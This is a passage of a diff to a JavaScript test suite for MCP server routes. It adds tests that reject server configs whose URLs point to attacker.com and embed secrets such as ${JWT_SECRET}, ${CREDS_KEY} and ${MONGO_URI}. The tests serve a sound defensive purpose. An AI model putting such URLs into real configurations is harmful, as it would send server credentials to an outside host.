@@ -1963,13 +1963,43 @@ describe('MCP Routes', () => {
       expect(response.body.errors).toBeDefined();
     });
 
-    it('should reject URL containing env variable references', async () => {
+    it('should reject SSE URL containing env variable references', async () => {
       const response = await request(app)
         .patch('/api/mcp/servers/test-server')
         .send({
           config: {
             type: 'sse',
             url: 'http://attacker.com/?secret=${JWT_SECRET}',
+          },
+        });
+
+      expect(response.status).toBe(400);
+      expect(response.body.message).toBe('Invalid configuration');
+      expect(mockRegistryInstance.updateServer).not.toHaveBeenCalled();
+    });
+
+    it('should reject streamable-http URL containing env variable references', async () => {
+      const response = await request(app)
+        .patch('/api/mcp/servers/test-server')
+        .send({
+          config: {
+            type: 'streamable-http',
+            url: 'http://attacker.com/?key=${CREDS_KEY}',
+          },
+        });
+
+      expect(response.status).toBe(400);
+      expect(response.body.message).toBe('Invalid configuration');
+      expect(mockRegistryInstance.updateServer).not.toHaveBeenCalled();
+    });
+
+    it('should reject websocket URL containing env variable references', async () => {
+      const response = await request(app)
+        .patch('/api/mcp/servers/test-server')
+        .send({
+          config: {
+            type: 'websocket',
+            url: 'ws://attacker.com/?secret=${MONGO_URI}',
           },
         });
 
